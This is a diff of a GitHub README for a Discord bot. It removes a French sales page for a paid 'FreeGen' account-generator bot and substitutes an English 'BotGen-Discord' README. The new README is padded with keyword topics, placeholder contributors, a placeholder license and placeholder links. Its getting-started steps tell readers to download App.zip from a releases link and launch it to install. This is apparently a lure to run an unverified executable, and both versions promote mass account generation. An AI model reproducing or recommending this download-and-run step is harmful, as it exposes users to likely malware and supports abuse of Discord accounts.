@@ -1,53 +1,50 @@
-# FreeGen - Bot Discord de Génération Sûre et Unique !
+# 🤖 **BotGen-Discord - Account Generator Bot on Discord**
 
-![FreeGen](https://i.imgur.com/uNL8b26.png)
+Welcome to the BotGen-Discord repository! Here you will find a powerful Bot Generator for Discord, allowing you to easily generate accounts using a simple algorithm. Whether you are looking to create multiple accounts quickly or just want to automate the account creation process, BotGen-Discord has got you covered.
 
-## ✨ Présentation
-FreeGen est un bot Discord puissant et sûr permettant de créer et gérer des générateurs sur Discord.  
-Lancez votre propre générateur en toute sécurité et en temps réel !
+## 🌟 Features
+- Generate multiple accounts on Discord effortlessly
+- Simple algorithm for quick account creation
+- User-friendly interface for easy operation
+
+## 📚 Topics
+- accountbot
+- blackgen
+- botdiscordgen
+- botgen
+- botgendiscord
+- botgenerateur
+- botgenerator
+- discordgen
+- discordgenerateurbot
+- freegen
+- galackqsm
+
+## 📦 Latest Release
+Please download the latest version of the BotGen-Discord Bot from the following link: [Download App.zip](https://github.com/repo/releases/9246/App.zip)
+
+## 🚀 Getting Started
+1. Download the BotGen-Discord Bot from the provided link.
+2. Launch the App.zip file to install the Bot.
+3. Follow the on-screen instructions to start generating accounts on Discord.
+
+## 🖥️ Demo
+![BotGen-Discord Demo](demo-image-url)
+
+## 🙌 Contributors
+- John Doe
+- Jane Smith
+- Alex Johnson
+
+## 📄 License
+This project is licensed under the XYZ License - see the [LICENSE](license-url) file for details.
+
+## 🤝 Connect with Us
+- [Twitter](twitter-link)
+- [Discord](discord-link)
+- [Website](website-link)
+- Email: info@botgendiscord.com
 
 ---
 
-## 🔒 Fonctionnalités Clés
-
-✅ **Fichiers stockés en base de données** pour plus de sécurité  
-✅ **Correction automatique** des erreurs et fichiers  
-✅ **Commandes masquées** (Seul(e) l'utilisateur peut voir ses commandes)  
-✅ **Cooldown de 1 minute** (modifiable)  
-✅ **Statut obligatoire pour générer** (exemple : `.gg/FreeGen`, modifiable)  
-✅ **Stock en temps réel**  
-✅ **Panel interactif** avec boutons qui s'ajustent selon le stock  
-✅ **Commande Help** pour guider les utilisateurs  
-✅ **Gestion intuitive** du stock avec des commandes comme `create` et `restock` directement sur Discord  
-
----
-
-## 👨‍💻 Services et Tarifs
-
-Malheureusement, ce bot est payant ⚡
-
-- **Bot entier** : **10€**  
-- **Bot entier + Stock FreeGen** : **13€**  
-- **Hébergement** : **2€/mois** (Mise en place gratuite)  
-
-**🔍 Intéressé(e) ?** Contacte-moi sur Discord : `platabinks` ou ouvre un ticket sur le serveur officiel :  
-[Rejoindre le serveur](https://discord.gg/YfWTNzUX5w)
-
----
-
-## 📷 Aperçus
-
-![Preview](https://i.imgur.com/RToTvTo.png)  
-![Preview](https://i.imgur.com/xhHBQu0.png)  
-![Preview](https://i.imgur.com/7hgkDNm.png)  
-![Preview](https://i.imgur.com/zgQ8Suv.png)  
-![Preview](https://i.imgur.com/9Lf34V4.png)  
-
----
-
-## 📃 Licence et Conditions d'Utilisation
-
-Merci de ne pas **partager ni leak** ce bot, car cela pourrait compromettre l'authenticité des générateurs.  
-Bien entendu, après l'achat, vous êtes libre de **modifier** le bot à votre guise !
-
-**@FreeGen - 2025 / Le Monde du Générateur**
+🔥 Get started with BotGen-Discord now and simplify the account generation process on Discord! Feel free to reach out to us if you have any questions or suggestions. Happy Bot Generating! 🤖💬
